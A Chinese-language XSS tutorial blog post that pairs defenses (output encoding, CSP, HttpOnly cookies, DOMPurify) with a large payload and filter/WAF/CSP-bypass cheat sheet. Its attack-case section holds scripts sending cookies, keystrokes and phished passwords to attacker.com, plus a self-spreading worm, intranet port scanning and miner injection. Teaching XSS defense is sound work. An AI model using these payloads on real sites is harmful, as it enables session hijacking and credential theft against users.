---
layout: post
title: "XSS攻击完全指南：原理、技巧与防御"
date: 2026-03-15 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [XSS, 跨站脚本攻击, 漏洞分析, 安全防御, 渗透测试, Web安全]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是XSS攻击](#什么是xss攻击)
- [XSS攻击原理](#xss攻击原理)
- [XSS攻击类型](#xss攻击类型)
- [XSS Payload大全](#xss-payload大全)
- [绕过技巧](#绕过技巧)
- [实战攻击案例](#实战攻击案例)
- [防御措施](#防御措施)
- [总结](#总结)

---

## 什么是XSS攻击

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是一种常见的Web安全漏洞，攻击者通过在网页中注入恶意脚本代码，使其在用户浏览器中执行，从而窃取用户敏感信息、劫持用户会话或执行其他恶意操作。

> **命名由来**：XSS原本缩写应为CSS，但为了与层叠样式表（Cascading Style Sheets）区分，故改名为XSS。

### XSS攻击的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 会话劫持 | 窃取用户Cookie，冒充用户身份登录 |
| 钓鱼攻击 | 伪造登录页面，诱骗用户输入账号密码 |
| 恶意重定向 | 将用户引导至恶意网站 |
| 键盘记录 | 记录用户在页面上的所有键盘输入 |
| 网页篡改 | 修改页面内容，显示虚假信息 |
| 挖矿脚本 | 利用用户浏览器进行加密货币挖矿 |
| 信息窃取 | 获取用户敏感信息（如银行卡号、密码等） |
| 蠕虫传播 | 在社交网站上自动发送恶意链接 |

### 常见注入点

XSS漏洞可能出现在任何用户输入被输出的位置：

1. **URL参数**：`?search=<script>alert(1)</script>`
2. **表单输入**：搜索框、评论框、用户名输入等
3. **HTTP头**：User-Agent、Referer、X-Forwarded-For等
4. **文件上传**：文件名、文件元数据
5. **JSON数据**：API接口返回的用户可控数据
6. **DOM操作**：JavaScript动态修改页面内容

---

## XSS攻击原理

### 漏洞产生原因

XSS漏洞产生的根本原因是**应用程序对用户输入的数据没有进行充分的验证和过滤**，直接将用户输入输出到页面上，导致恶意脚本被执行。

#### 漏洞代码示例

**PHP示例（存在漏洞）：**

```php
<?php
// 反射型XSS漏洞
$name = $_GET['name'];
echo "Hello, " . $name;

// 存储型XSS漏洞
$comment = $_POST['comment'];
$query = "INSERT INTO comments (content) VALUES ('$comment')";
// 后续从数据库读取并直接输出
?>
```

**JavaScript示例（DOM型XSS漏洞）：**

```javascript
// 危险的DOM操作
var hash = location.hash.slice(1);
document.write(hash);

// 危险的innerHTML使用
document.getElementById('output').innerHTML = location.search;
```

#### 攻击示例

正常请求：
```
http://example.com/search.php?q=security
```

页面输出：
```html
<p>搜索结果：security</p>
```

恶意请求：
```
http://example.com/search.php?q=<script>alert(document.cookie)</script>
```

页面输出：
```html
<p>搜索结果：<script>alert(document.cookie)</script></p>
```

浏览器会执行 `<script>` 标签中的代码，弹出用户的Cookie信息。

### XSS攻击流程

```
寻找注入点 → 构造Payload → 测试执行 → 利用漏洞 → 获取敏感信息
```

---

## XSS攻击类型

### 1. 反射型XSS（Reflected XSS）

**反射型XSS** 是最常见的XSS类型，恶意脚本通过URL参数传递，服务器将参数内容直接反射回页面，脚本在浏览器中执行。

#### 特点

- **非持久化**：恶意代码不存储在服务器上
- **需要诱导**：需要诱骗用户点击恶意链接
- **一次性**：每次攻击都需要用户访问特定URL

#### 攻击流程

```
攻击者构造恶意URL → 发送给受害者 → 受害者点击链接 → 服务器返回包含恶意脚本的页面 → 浏览器执行脚本
```

#### 示例

```
http://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### 2. 存储型XSS（Stored XSS）

**存储型XSS** 又称持久型XSS，恶意脚本被永久存储在服务器上（如数据库、日志文件等），当其他用户访问包含该恶意脚本的页面时，脚本会被执行。

#### 特点

- **持久化**：恶意代码存储在服务器上
- **影响广泛**：所有访问该页面的用户都会受到影响
- **危害更大**：不需要诱骗用户点击特定链接

#### 常见场景

- 评论系统
- 用户资料页面
- 论坛帖子
- 博客留言
- 商品评价

#### 示例

攻击者在评论框提交：
```html
<script>
document.location='https://attacker.com/steal?cookie='+document.cookie;
</script>
```

当其他用户查看该评论时，Cookie会被发送到攻击者服务器。

### 3. DOM型XSS（DOM-based XSS）

**DOM型XSS** 是一种特殊的XSS类型，漏洞存在于客户端JavaScript代码中，不经过服务器端处理，完全在浏览器端通过DOM操作触发。

#### 特点

- **纯前端漏洞**：不经过服务器端处理
- **难以检测**：服务器日志中不会留下攻击痕迹
- **依赖DOM操作**：与JavaScript的DOM操作相关

#### 常见触发点

| 输入源 | 输出点 | 示例 |
|-------|-------|------|
| `location.hash` | `innerHTML` | `document.write(location.hash)` |
| `location.search` | `eval()` | `eval(location.search)` |
| `document.URL` | `document.write()` | `document.write(document.URL)` |
| `document.referrer` | `setTimeout()` | `setTimeout(referrer, 1000)` |
| `window.name` | 各种DOM操作 | 跨页面传递数据 |

#### 示例

```javascript
// 存在漏洞的代码
var name = decodeURIComponent(location.hash.slice(1));
document.getElementById('welcome').innerHTML = 'Hello, ' + name;
```

攻击URL：
```
http://example.com/page.html#<img src=x onerror=alert(1)>
```

### 4. Mutation XSS（mXSS）

**Mutation XSS** 是一种利用浏览器HTML解析器特性，通过多次解析导致恶意代码被触发的XSS类型。

#### 原理

某些HTML内容在第一次解析时可能是安全的，但经过innerHTML赋值、浏览器自动修复等操作后，会被重新解析为恶意代码。

#### 示例

```html
<!-- 初始输入 -->
<img src="x" alt="``onerror=alert(1)">

<!-- 经过innerHTML处理后可能被解析为 -->
<img src="x" alt="``onerror=alert(1)">
```

### 5. Blind XSS（盲XSS）

**Blind XSS** 是一种存储型XSS的变种，攻击者无法直接看到攻击结果，恶意脚本在管理员或其他用户查看时才会执行。

#### 常见场景

- 后台管理系统
- 客服系统
- 日志查看页面
- 反馈提交系统

#### 利用方式

攻击者通常使用XSS Hunter、Burp Collaborator等工具来接收盲XSS的触发通知：

```html
<script src="https://xsshunter.example.com/your-unique-id"></script>
```

### 6. Self-XSS

**Self-XSS** 是一种需要诱骗用户在自己浏览器中执行恶意代码的XSS类型，通常结合社会工程学使用。

#### 常见手法

攻击者诱骗用户在浏览器控制台执行代码：

```javascript
// 攻击者声称这是获取免费会员的代码
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({cookie: document.cookie})
});
```

---

## XSS Payload大全

### 基础Payload

#### 经典Alert弹窗

```html
<!-- 基础形式 -->
<script>alert(1)</script>
<script>alert('XSS')</script>

<!-- 使用String.fromCharCode绕过过滤 -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- 使用编码 -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

#### 图片标签事件

```html
<!-- onerror事件 -->
<img src=x onerror=alert(1)>
<img src="javascript:alert(1)">

<!-- 使用无效图片 -->
<img src=1 onerror=alert(1)>
<img src=# onerror=alert(1)>
```

#### 其他HTML标签

```html
<!-- body标签 -->
<body onload=alert(1)>
<body onpageshow=alert(1)>

<!-- svg标签 -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

!-- iframe标签 -->
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>

!-- input标签 -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

!-- video/audio标签 -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

!-- details标签 -->
<details open ontoggle=alert(1)>
```

### 事件处理器Payload

#### 常见事件处理器

| 事件 | 触发条件 | Payload示例 |
|------|---------|------------|
| `onerror` | 资源加载失败 | `<img src=x onerror=alert(1)>` |
| `onload` | 资源加载完成 | `<body onload=alert(1)>` |
| `onclick` | 鼠标点击 | `<button onclick=alert(1)>Click</button>` |
| `onmouseover` | 鼠标悬停 | `<div onmouseover=alert(1)>Hover</div>` |
| `onfocus` | 元素获得焦点 | `<input onfocus=alert(1) autofocus>` |
| `onblur` | 元素失去焦点 | `<input onblur=alert(1)>` |
| `onchange` | 值发生改变 | `<input onchange=alert(1)>` |
| `onsubmit` | 表单提交 | `<form onsubmit=alert(1)><input type=submit></form>` |
| `onmouseenter` | 鼠标进入 | `<div onmouseenter=alert(1)>Enter</div>` |
| `onmouseleave` | 鼠标离开 | `<div onmouseleave=alert(1)>Leave</div>` |
| `onkeydown` | 键盘按下 | `<input onkeydown=alert(1)>` |
| `onkeyup` | 键盘释放 | `<input onkeyup=alert(1)>` |
| `onkeypress` | 键盘按键 | `<input onkeypress=alert(1)>` |
| `ondrag` | 元素被拖动 | `<div draggable=true ondrag=alert(1)>Drag</div>` |
| `ondrop` | 元素被放置 | `<div ondrop=alert(1)>Drop</div>` |
| `oncut` | 内容被剪切 | `<input oncut=alert(1) value="cut me">` |
| `oncopy` | 内容被复制 | `<input oncopy=alert(1) value="copy me">` |
| `onpaste` | 内容被粘贴 | `<input onpaste=alert(1)>` |
| `oncontextmenu` | 右键菜单 | `<div oncontextmenu=alert(1)>Right Click</div>` |
| `ontoggle` | details切换 | `<details ontoggle=alert(1)><summary>Click</summary></details>` |

### 基于上下文的Payload

#### 在HTML标签内

```html
<!-- 在div标签内 -->
<div>[PAYLOAD]</div>

<!-- 使用标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 使用事件 -->
" onmouseover=alert(1) x="
' onmouseover=alert(1) x='
```

#### 在HTML属性内

```html
<!-- 在value属性内 -->
<input value="[PAYLOAD]">

<!-- 闭合属性并添加事件 -->
" onmouseover=alert(1) x="
"><img src=x onerror=alert(1)><input value="
```

#### 在JavaScript代码内

```javascript
// 在字符串内
var name = '[PAYLOAD]';

// Payload: ';alert(1);'
// Payload: ';alert(1);//

// 在代码上下文中
var data = {name: [PAYLOAD]};

// Payload: alert(1)
```

#### 在URL上下文中

```html
<!-- 在href属性内 -->
<a href="[PAYLOAD]">Link</a>

<!-- Payload -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- 在src属性内 -->
<img src="[PAYLOAD]">

<!-- Payload -->
x onerror=alert(1)
```

### Polyglot Payload（通用Payload）

Polyglot XSS是可以同时在多种上下文中执行的Payload：

```javascript
// 基础Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// 简版Polyglot
'"--></style></script><script>alert(1)</script>

// 更简洁的Polyglot
'"--><svg onload=alert(1)>

// 通用闭合
'"--></script></title></style><img src=x onerror=alert(1)>
```

### 高级Payload

#### 使用JavaScript伪协议

```html
<!-- 基础形式 -->
<a href="javascript:alert(1)">Click</a>

<!-- 编码绕过 -->
<a href="javascript:%61%6c%65%72%74%28%31%29">Click</a>
<a href="jav&#x61;script:alert(1)">Click</a>

<!-- 使用data URI -->
<iframe src="data:text/html,<script>alert(1)</script>">
<img src="data:image/svg+xml,<svg onload=alert(1)>">
```

#### 使用Unicode和编码

```html
<!-- HTML实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- 十六进制编码 -->
<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x31\x29">

<!-- Unicode编码 -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029">

<!-- URL编码 -->
<img src=x onerror=%61%6c%65%72%74%28%31%29>
```

#### 使用模板字符串

```javascript
// 使用模板字符串绕过
<script>alert`1`</script>
<script>setTimeout`alert\x281\x29`</script>
```

---

## 绕过技巧

### 1. 标签和属性过滤绕过

#### 大小写混淆

```html
<!-- 绕过对script的过滤 -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- 绕过对onerror的过滤 -->
<img src=x OnErRoR=alert(1)>
<IMG SRC=X ONERROR=ALERT(1)>
```

#### 使用其他标签

```html
<!-- 当script被过滤时 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

#### 使用HTML5新标签

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<keygen autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>XSS</marquee>
<isindex type=image src=x onerror=alert(1)>
```

### 2. 事件处理器绕过

#### 使用不同的事件

```html
<!-- 当onerror被过滤时 -->
<img src=x onload=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onmouseenter=alert(1)>
<img src=x onpointerenter=alert(1)>
<img src=x onanimationstart=alert(1)>
```

#### 使用HTML5新事件

```html
<!-- 使用HTML5拖放事件 -->
<div draggable=true ondragstart=alert(1)>Drag</div>
<div ondrop=alert(1) ondragover=allowDrop(event)>Drop</div>

<!-- 使用触摸事件 -->
<div ontouchstart=alert(1)>Touch</div>
<div ontouchend=alert(1)>Touch</div>

<!-- 使用剪贴板事件 -->
<input oncut=alert(1) value="cut">
<input oncopy=alert(1) value="copy">
<input onpaste=alert(1)>
```

### 3. 编码绕过

#### HTML实体编码

```html
<!-- 十进制 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- 十六进制 -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

<!-- 不带分号 -->
<img src=x onerror="&#97&#108&#101&#114&#116&#40&#49&#41">
```

#### URL编码

```html
<!-- 对属性值进行URL编码 -->
<img src=x onerror=%61%6c%65%72%74%28%31%29>

<!-- 双重URL编码 -->
<img src=x onerror=%2561%256c%2565%2572%2574%2528%2531%2529>
```

#### Unicode编码

```javascript
<!-- JavaScript Unicode编码 -->
<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</script>

<!-- 使用eval执行Unicode编码的代码 -->
<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
```

#### Base64编码

```html
<!-- 使用data URI和Base64 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
```

### 4. WAF绕过技巧

#### 使用注释分割

```html
<!-- 使用HTML注释分割关键字 -->
<scr<!--test-->ipt>alert(1)</scr<!--test-->ipt>

<!-- 使用JavaScript注释 -->
<script>/**/alert/**/(1)</script>
```

#### 使用换行和空格

```html
<!-- 使用换行符 -->
<img src=x
onerror=alert(1)>

<!-- 使用Tab -->
<img src=x	onerror=alert(1)>

<!-- 使用反引号（某些浏览器） -->
<img src=x`onerror=alert(1)>
```

#### 使用JavaScript技巧

```javascript
// 使用String.fromCharCode
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

// 使用concat
<script>alert``.concat(1)</script>

// 使用模板字符串
<script>setTimeout`alert\x281\x29`</script>

// 使用location
<script>location='javascript:alert(1)'</script>

// 使用top
<script>top['al'+'ert'](1)</script>

// 使用window
<script>window['ale'+'rt'](1)</script>
```

#### 使用替代语法

```javascript
// 使用圆括号的不同写法
<script>alert&#40;1&#41;</script>
<script>alert&#x28;1&#x29;</script>

// 使用反引号代替圆括号
<script>alert`1`</script>

// 使用构造函数
<script>new Function`alert\x281\x29```</script>
```

### 5. CSP绕过

#### 使用允许的域名

```html
<!-- 如果允许了某个CDN -->
<script src="https://allowed-cdn.com/attacker-controlled-script.js"></script>

<!-- 使用JSONP端点 -->
<script src="https://trusted-site.com/jsonp?callback=alert(1)"></script>
```

#### 使用unsafe-inline

```html
<!-- 如果允许了unsafe-inline -->
<script nonce="correct-nonce">alert(1)</script>
```

#### 使用data URI（如果允许）

```html
<script src="data:text/javascript,alert(1)"></script>
```

---

## 实战攻击案例

### 1. Cookie窃取

#### 基础Cookie窃取

```javascript
<script>
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

#### 使用Image对象

```javascript
<script>
new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

#### 窃取HttpOnly Cookie（通过XHR）

```javascript
<script>
// 虽然不能直接读取HttpOnly Cookie，但可以通过XHR请求获取
fetch('https://victim.com/api/userinfo', {
    credentials: 'include'
}).then(r => r.text()).then(data => {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
});
</script>
```

### 2. 会话劫持

#### 自动登录攻击

```javascript
<script>
// 将Cookie发送到攻击者服务器
fetch('https://attacker.com/session?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href));

// 显示钓鱼登录框
setTimeout(function() {
    document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;text-align:center;padding-top:100px;">' +
        '<h1>会话已过期，请重新登录</h1>' +
        '<form onsubmit="fetch(\'https://attacker.com/credentials\', {method: \'POST\', body: JSON.stringify({user: this.user.value, pass: this.pass.value})});return false;">' +
        '<input name="user" placeholder="用户名"><br>' +
        '<input name="pass" type="password" placeholder="密码"><br>' +
        '<button type="submit">登录</button>' +
        '</form></div>';
}, 1000);
</script>
```

### 3. 键盘记录

```javascript
<script>
var keys = '';
document.addEventListener('keypress', function(e) {
    keys += String.fromCharCode(e.which);
    if (keys.length > 50) {
        fetch('https://attacker.com/keys?data=' + encodeURIComponent(keys));
        keys = '';
    }
});
</script>
```

### 4. 钓鱼攻击

#### 伪造登录页面

```javascript
<script>
// 保存原始页面内容
var originalContent = document.body.innerHTML;

// 替换为钓鱼页面
document.body.innerHTML = `
<div style="max-width:400px;margin:100px auto;padding:20px;border:1px solid #ccc;border-radius:5px;">
    <h2 style="text-align:center;">登录</h2>
    <form onsubmit="
        fetch('https://attacker.com/phish', {
            method: 'POST',
            body: JSON.stringify({
                username: document.getElementById('u').value,
                password: document.getElementById('p').value,
                original_url: location.href
            })
        });
        alert('登录失败，请重试');
        return false;
    ">
        <input id="u" placeholder="用户名" style="width:100%;padding:10px;margin:5px 0;"><br>
        <input id="p" type="password" placeholder="密码" style="width:100%;padding:10px;margin:5px 0;"><br>
        <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;">登录</button>
    </form>
</div>`;
</script>
```

### 5. 挖矿脚本注入

```javascript
<script>
// 注入Coinhive挖矿脚本（已停止服务，仅作示例）
var script = document.createElement('script');
script.src = 'https://authedmine.com/lib/authedmine.min.js';
document.head.appendChild(script);

setTimeout(function() {
    var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
    miner.start();
}, 2000);
</script>
```

### 6. 蠕虫传播

```javascript
<script>
// XSS蠕虫示例（Twitter风格的传播）
(function() {
    // 获取当前用户的好友/关注者列表
    fetch('/api/friends').then(r => r.json()).then(friends => {
        // 向每个好友发送包含恶意代码的消息
        friends.forEach(friend => {
            fetch('/api/message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    to: friend.id,
                    // 消息中包含蠕虫代码
                    content: 'Check this out! <script>' + wormCode + '<\/script>'
                })
            });
        });
    });
    
    // 蠕虫代码本身
    var wormCode = arguments.callee.toString();
})();
</script>
```

### 7. 内网探测

```javascript
<script>
// 探测内网IP
var ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
ips.forEach(function(ip) {
    var img = new Image();
    img.onload = function() {
        fetch('https://attacker.com/internal?found=' + ip);
    };
    img.src = 'http://' + ip + '/favicon.ico';
});

// 扫描内网端口
for (var port = 1; port < 1000; port++) {
    (function(p) {
        var img = new Image();
        img.onload = function() {
            fetch('https://attacker.com/port?port=' + p);
        };
        img.src = 'http://192.168.1.1:' + p + '/test';
    })(port);
}
</script>
```

---

## 防御措施

### 1. 输入验证和过滤

#### 白名单验证

```php
<?php
// 只允许特定字符
$username = $_GET['username'];
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die('Invalid username');
}

// 只允许特定标签（富文本编辑器场景）
$allowed_tags = '<p><br><strong><em><a>';
$content = strip_tags($_POST['content'], $allowed_tags);
?>
```

#### 黑名单过滤（不推荐作为唯一手段）

```php
<?php
// 过滤危险字符（可能被绕过）
$input = preg_replace('/<script.*?>/i', '', $input);
$input = preg_replace('/javascript:/i', '', $input);
$input = preg_replace('/on\w+\s*=/i', '', $input);
?>
```

### 2. 输出编码

#### HTML实体编码

```php
<?php
// PHP htmlspecialchars函数
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "Hello, $name";

// ENT_QUOTES 会转换单引号和双引号
// ENT_HTML5 使用HTML5实体
?>
```

```javascript
// JavaScript编码函数
function htmlEncode(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}
```

#### JavaScript编码

```php
<?php
// 在JavaScript上下文中输出时
$data = json_encode($_GET['data'], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
echo "<script>var data = $data;</script>";
?>
```

#### URL编码

```php
<?php
// URL参数编码
$url = 'https://example.com/search?q=' . urlencode($_GET['q']);
?>
```

### 3. Content Security Policy (CSP)

#### 基础CSP配置

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
```

#### 严格CSP配置

```http
Content-Security-Policy: 
    default-src 'none';
    script-src 'self';
    style-src 'self';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    media-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

#### 使用Nonce的CSP

```http
Content-Security-Policy: script-src 'nonce-随机值';
```

```html
<script nonce="随机值">
    // 这段脚本会被执行
    alert('合法脚本');
</script>

<script>
    // 这段脚本不会被执行（没有正确的nonce）
    alert('XSS攻击');
</script>
```

### 4. HttpOnly Cookie

```php
<?php
// PHP设置HttpOnly Cookie
setcookie('session', $token, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,      // 仅HTTPS传输
    'httponly' => true,    // 禁止JavaScript访问
    'samesite' => 'Strict' // CSRF防护
]);
?>
```

### 5. X-XSS-Protection

```http
# 启用浏览器XSS过滤器
X-XSS-Protection: 1; mode=block

# 禁用（如果实现了更强大的CSP）
X-XSS-Protection: 0
```

### 6. 安全的DOM操作

```javascript
// 危险的写法
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);

// 安全的写法
element.textContent = userInput;
element.innerText = userInput;

// 使用安全的API创建元素
var div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);

// 使用DOMPurify库
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 7. 框架和库的安全使用

#### React

```jsx
// React自动转义JSX中的内容
function SafeComponent({ userInput }) {
    return <div>{userInput}</div>; // 自动转义
}

// 危险的写法（需要特别注意）
function DangerousComponent({ userInput }) {
    return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}
```

#### Vue.js

```vue
<template>
    <!-- 自动转义 -->
    <div>{{ userInput }}</div>
    
    <!-- 危险的写法 -->
    <div v-html="userInput"></div>
</template>
```

#### Angular

```typescript
// Angular自动转义插值表达式
<p>{{ userInput }}</p>

// 使用内置管道进行净化
<p [innerHTML]="userInput | safeHtml"></p>
```

### 8. 安全开发最佳实践

#### 安全编码检查清单

- [ ] 对所有用户输入进行验证和过滤
- [ ] 对所有输出进行适当的编码
- [ ] 使用参数化查询防止SQL注入
- [ ] 实施Content Security Policy
- [ ] 设置HttpOnly、Secure、SameSite Cookie属性
- [ ] 避免使用危险的DOM操作（innerHTML等）
- [ ] 使用现代框架的安全特性
- [ ] 定期进行安全审计和代码审查
- [ ] 使用自动化安全扫描工具
- [ ] 及时更新依赖库和框架

#### 安全测试工具

| 工具 | 用途 | 链接 |
|------|------|------|
| XSSer | 自动化XSS检测 | https://xsser.03c8.net |
| XSStrike | 高级XSS检测 | https://github.com/s0md3v/XSStrike |
| DalFox | 现代XSS扫描器 | https://github.com/hahwul/dalfox |
| Burp Suite | Web应用安全测试 | https://portswigger.net/burp |
| OWASP ZAP | 开源Web应用扫描器 | https://www.zaproxy.org |
| DOMPurify | XSS净化库 | https://github.com/cure53/DOMPurify |

---

## 总结

XSS攻击是一种历史悠久但仍然广泛存在的Web安全漏洞。随着Web应用变得越来越复杂，XSS攻击的形式也在不断演变。防御XSS需要从多个层面入手：

### 防御要点

1. **输入验证**：对所有用户输入进行白名单验证，拒绝或过滤危险字符
2. **输出编码**：根据输出上下文进行适当的编码（HTML、JavaScript、URL等）
3. **CSP策略**：实施严格的Content Security Policy，限制脚本执行来源
4. **HttpOnly Cookie**：设置Cookie的HttpOnly属性，防止JavaScript窃取
5. **安全开发**：遵循安全编码规范，使用安全的API和框架

### 安全开发建议

**对于开发者**：
- 永远不要信任用户输入，始终进行验证和过滤
- 使用现代Web框架的安全特性（自动转义等）
- 实施Defense in Depth（纵深防御）策略
- 定期进行安全培训和代码审查
- 关注安全社区的最新动态和漏洞通告

**对于安全研究人员**：
- 在进行渗透测试前确保获得合法授权
- 使用隔离的测试环境进行漏洞研究
- 负责任地披露漏洞，帮助厂商修复
- 遵守相关法律法规和道德准则

### 学习资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Google XSS Guide](https://www.google.com/about/appsecurity/learning/xss/)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [狼组安全团队 - XSS知识库](https://wiki.wgpsec.org/knowledge/ctf/xss.html)

---

## 参考资源

- [OWASP Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Web Docs - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Can I Use - Content Security Policy](https://caniuse.com/contentsecuritypolicy)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [XSS Hunter](https://xsshunter.com/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Bleach (Python HTML sanitizer)](https://github.com/mozilla/bleach)

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年3月15日*
